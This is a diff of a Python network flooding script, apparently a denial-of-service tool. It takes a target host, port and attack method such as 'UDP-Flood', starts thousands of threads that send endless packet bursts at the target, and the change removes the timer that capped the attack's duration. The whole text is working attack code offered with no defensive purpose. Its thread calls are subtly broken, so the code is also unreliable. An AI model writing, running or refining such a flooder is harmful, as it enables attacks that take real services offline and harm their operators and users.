@@ -1,12 +1,12 @@
 import sys
 import socket
 import threading
-import time as clock
+#import time as clock
 
 host = str(sys.argv[1])
 port = int(sys.argv[2])
-time = int(sys.argv[3])
-method = str(sys.argv[4])
+#time = int(sys.argv[4])
+method = str(sys.argv[3])
 
 loops = 10000
 
@@ -18,13 +18,14 @@ def send_packet(amplifier):
         while True: s.send(b"\x99" * amplifier)
     except: return s.close()
 
-def timer(timeout):
-    while True:
-        if clock.time() > timeout: exit()
-        if clock.time() < timeout: clock.sleep(0.1)
+#def timer(timeout):
+#    while True:
+#        if clock.time() > timeout: exit()
+#        if clock.time() < timeout: clock.sleep(0.1)
 
 def attack_HQ():
-    timeout = clock.time() + time
+    #timeout = clock.time() + time
+    #timer(timeout)
     if method == "UDP-Flood":
         for sequence in range(loops):
             threading.Thread(target=send_packet(375), daemon=True).start()
@@ -35,6 +36,5 @@ def attack_HQ():
         for sequence in range(loops):
             threading.Thread(target=send_packet(375), daemon=True).start()
             threading.Thread(target=send_packet(750), daemon=True).start()
-    timer(timeout)
 
 attack_HQ()
